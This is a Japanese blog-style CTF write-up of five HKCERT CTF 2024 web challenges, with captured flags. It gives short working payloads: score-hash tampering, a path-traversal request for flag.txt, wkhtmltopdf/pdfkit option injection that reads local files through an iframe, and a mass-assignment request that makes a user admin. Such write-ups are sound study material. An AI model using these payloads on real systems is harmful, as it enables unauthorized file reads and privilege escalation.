# HKCERT CTF 2024 (Qualifying Round)

2024/11/09 ~ 2023/11/10 は、HKCERT CTF 2024 (Qualifying Round)に参加していました。

## New Free Lunch

なんのゲームかはわかりませんでしたが、scoreをサーバに送信します。
その際、scoreとhashを送信するわけですが、hashは`generateHash`関数で求められるので、hashを求める部分にbreakpointをおいてscoreを改変することでFLAGが取得できます。

```js
async function endGame() {
            clearInterval(gameInterval);
            clearInterval(timerInterval);
            alert('Game Over! Your score: ' + score);

            const hash = generateHash(secretKey + username + score);

            fetch('/update_score.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    score: score,
                    hash: hash
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Score updated!');
                } else {
                    alert('Failed to update score.');
                }
                location.reload();
            });
        }
```

もしくはsecretKeyがハードコードされているのでconsoleで求めるでもいいでしょう。

`hkcert24{r3d33m_f0r_4_fr33_lunch}`


## Custom Web Server (1)

Overflowを起こしましょう。

```text
GET //./../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..//////////////flag.txt.js HTTP/1.1
```

`hkcert24{bu1ld1n9_4_w3bs3rv3r_t0_s3rv3_5t4t1c_w3bp4935_1s_n0ntr1vial}`


## Webpage to PDF (1)

shlex.splitを使っているので、空白を使うことでオプションを制御できます。

Cookieに`--enable-local-file-access `をつけて、送れば`<iframe src="file:///flag.txt">`でフラグが抜けます。

`hkcert24{h0w-t0-use-AI-wisely-and-s4fe1y?}`

## Webpage to PDF (2)

python-pdfkitは、metaタグでなぜかoptionが設定できるらしいので、`<meta name="pdfkit-enable-local-file-access" content=""><iframe src="file:///flag.txt">`のようにして、終わり。

`hkcert24{c1oud-is-rand0m-st4ngers-c0mputer-and-libr4ries-are-r4ndom-stang3rs-c0de}`

## Mystiz's Mini CTF (2)

registerの処理時、Mass Assignmentがありそうでした。

```python
@route.route('/register/', methods=[HTTPMethod.POST])
def ():
    user = User()
    UserForm = model_form(User)

    form = UserForm(request.form, obj=user)

    if not form.validate():
        flash('Invalid input', 'warning')
        return redirect(url_for('pages.register'))

    form.populate_obj(user)

    user_with_same_username = User.query_view.filter_by(username=user.username).first()
    if user_with_same_username is not None:
        flash('User with the same username exists.', 'warning')
        return redirect(url_for('pages.register'))

    db.session.add(user)
    db.session.commit()

    login_user(user)
    return redirect(url_for('pages.homepage'))
```

ので、`username=guest01&password=password&is_admin=True&score=100000000`を送ってみると、adminユーザになれます。

あとは、問題管理ページに行くだけでフラグが取得できます。

フラグ記録していませんでした。:cry: